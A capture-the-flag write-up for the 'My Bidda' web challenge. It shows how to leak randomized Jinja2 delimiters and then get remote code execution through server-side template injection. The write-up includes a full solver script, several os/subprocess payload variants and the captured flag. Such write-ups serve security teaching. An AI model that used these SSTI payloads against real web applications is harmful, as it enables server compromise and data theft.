# My Bidda

## Description

> Cities are way overcrowded and noisy, I want to live in a small town. Tell me about your bidda.
>
> One of my friends found a vulnerability but he told me it's fixed now, can you check?
>
> Website: <http://mybidda.challs.srdnlen.it>
>
> Attachments: my_bidda.zip

## Setup

```bash
cd src
docker-compose up
```

## solver.py

```python
import requests
import base64
import json
import re

# BASE_URL = "http://mybidda.challs.srdnlen.it"
BASE_URL = "http://localhost"


def leak_random_string(s: requests.Session) -> str:
    resp = s.get(
        f"{BASE_URL}/inspect_bidda",
        params={"name": "block_start_string"},
        cookies={
            "biddas": base64.b64encode(
                json.dumps([{"name": "dummy"}]).encode()
            ).decode()
        },
    )

    m = re.findall(r"Did you want to see the default bidda called @(.*?)\?", resp.text)
    assert len(m) == 1

    leak_random_string = m[0]
    return leak_random_string


def rce(s: requests.Session, random_string: str) -> str:
    # This payload is not working in local environment because of no subprocess and os.
    # payload = """
    # {% for x in ''.__class__.__mro__[1].__subclasses__() if "Popen" in x.__name__ %}
    #     {{ x('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
    # {% endfor %}
    # """.replace(
    #     "\n", ""
    # ).strip()

    # available payload:
    payload = """{{ x.__init__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"""
    # payload = """{{ x.__init__.__builtins__.__import__('subprocess').Popen('cat flag.txt',shell=True,stdout=-1).communicate()[0] }}"""
    # payload = """{{ x.__init__.__builtins__.__import__('subprocess').run('cat flag.txt',shell=True,capture_output=True).stdout }}"""
    # payload = """{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"""

    payload = payload.replace("{{", "!" + random_string)
    payload = payload.replace("}}", random_string + "!")
    payload = payload.replace("{%", "@" + random_string)
    payload = payload.replace("%}", random_string + "@")

    data = {"name": payload, "image": "b", "population": "c"}

    resp = s.post(f"{BASE_URL}/send_bidda", data=data)

    return resp.text


def main():
    s = requests.Session()
    # s.proxies = {"http": "http://127.0.0.1:8080"}

    # Step 1: Leak random_string
    random_string = leak_random_string(s)

    # Step 2: RCE with SSTI
    resp = rce(s, random_string)
    print(resp)


if __name__ == "__main__":
    main()
```

```console
$ python3 solver.py
<h1> srdnlen{be_careful_with_instruction_set_randomization}
 </h1> <h2> c </h2> <img src="b" />
```

## Solution

The attached my_bidda.zip archive is the following:

```console
$ unzip -t my_bidda.zip
Archive:  my_bidda.zip
    testing: app.py                   OK
    testing: flag.txt                 OK
    testing: templates/index.html     OK
    testing: templates/inspect_bidda.html   OK
    testing: templates/send_bidda.html   OK
No errors detected in compressed data of my_bidda.zip.
```

Looking at the provided files.

```python
# app.py
@app.route("/send_bidda", methods=["GET", "POST"])
def send_bidda():
  if request.method == "GET":
    return env.get_template("send_bidda.html").render()
  else:
    name = request.form.get("name")
    population = request.form.get("population")
    image = request.form.get("image")
    template = f"<h1> { name } </h1> <h2> { population } </h2> <img src=\"{ image }\" />"

    biddas = request.cookies.get("biddas")
    if biddas:
      biddas = json.loads(base64.b64decode(biddas))
      biddas.append({"name": name,"population" : population, "image" :image})
    else:
      biddas = [{"name": name,"population" : population, "image" :image}]
    resp = make_response(env.from_string(template).render())
    resp.set_cookie("biddas", base64.b64encode(json.dumps(biddas).encode()).decode())
    return resp
```

RCE with SSTI can occur because name, population and image variables embed in f-string are controllable by user and not escaped in server side.
If name is `{{ 7*7 }}` and it returns 49, We can SSTI.
Moreover, we can RCE by using an existing object such as subprocess or os.system.

The following is a reference for the RCE payload.

- [Jinja2 SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
- [Server Side Template Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#jinja2)

But `!<random_string>` and `<random_string>!` are used intead of `{{` and `}}`:

```python
# app.py
random_string = ''.join(random.choice(string.ascii_letters) for i in range(10))
env = jinja2.Environment(loader=PackageLoader("app"),
                         block_start_string='@'+random_string,
                         block_end_string=random_string+'@',
                         variable_start_string='!'+random_string,
                         variable_end_string=random_string+'!')
```

[API — Jinja Documentation (3.0.x)](https://jinja.palletsprojects.com/en/3.0.x/api/#jinja2.Environment)

> variable_start_string
>
> The string marking the beginning of a print statement. Defaults to '{{'.

`random_string` is genereated at server startup and we need to leak this for RCE.

```python
# app.py
@app.get("/inspect_bidda")
def inspect_bidda():
  name = request.args.get("name")
  biddas = request.cookies.get("biddas")
  if biddas:
    biddas = json.loads(base64.b64decode(biddas))
    for bidda in biddas:
      if bidda["name"] == name:
        return env.get_template("inspect_bidda.html").render(env=env, bidda=bidda)
    return env.get_template("inspect_bidda.html").render(env=env, name=name)
  else:
    return env.get_template("send_bidda.html").render()
```

```html+jinja
{# inspect_bidda.html #}
{% if bidda %}
<div class="column">
  <img class="demo cursor" src="{{ bidda.image }}" style="width:100%" alt="{{ bidda.name }} - Population: {{ bidda.population }}">
</div>
{% else %}
  {% set tmp = env.__dict__.get(name) %}
  {% if tmp == None %}
  <div class="column">
    <img class="demo cursor" src="https://lh6.googleusercontent.com/Bu-pRqU_tWZV7O3rJ5nV1P6NjqFnnAs8kVLC5VGz_Kf7ws0nDUXoGTc7pP87tyUCfu8VyXi0YviIm7CxAISDr2lJSwWwXQxxz98qxVfMcKTJfLPqbcfhn-QEeOowjrlwX1LYDFJN" style="width:100%" alt="404 Bidda Not Found - Population: 0">
  </div>
  {% else %}
  <div class="column">
    <p>Did you want to see the default bidda called {{ tmp }}?</p>
    <a href="/">In the home you can see them all</a>
  </div>
  {% endif %}
{% endif %}
```

`set tmp = env.__dict__.get(name)` is interesting.
If we can set `name` to `block_start_string` in query string and call `env.__dict__.get('block_start_string')`, we can leak `random_string`.
Fortunately, if the name in cookie and query string are different, we can call this.
